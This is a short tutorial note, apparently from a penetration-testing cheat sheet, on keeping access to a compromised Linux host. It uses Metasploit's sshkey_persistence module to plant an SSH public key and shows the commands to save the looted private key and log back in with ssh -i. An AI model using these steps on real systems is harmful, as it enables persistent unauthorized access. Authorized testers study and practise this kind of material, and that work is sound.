# Establishing Persistence using SSH Keys

SSH is service that allows us to remotely connect to a target machine using appropriate credentials. SSH is an upgraded and secure version of Telnet.
SSH allows two kinds of authentication:
1. Traditional method using a password
2. Or using a SSH Private Key file

#### SSH KEY PERSITENCE USING METASPLOIT:

**How this module works?**
This module will add a Public SSH key to a specified user (or all), and gets us a private SSH key to allow remote login via SSH at any time.

```c
use post/linux/manage/sshkey_persistence
set SESSION [SESSION ID]
set CREATESSHFOLDER true
exploit
# access the private key with 'loot'
```

Now we can copy the contents from the `loot` and create a new key file and give appropriate permissions. 

```c
vim ssh_key
chmod 400 [SSHKEY_FILE]
ssh -i [SSHKEY_FILE] [USER]@[TARGET] 
```


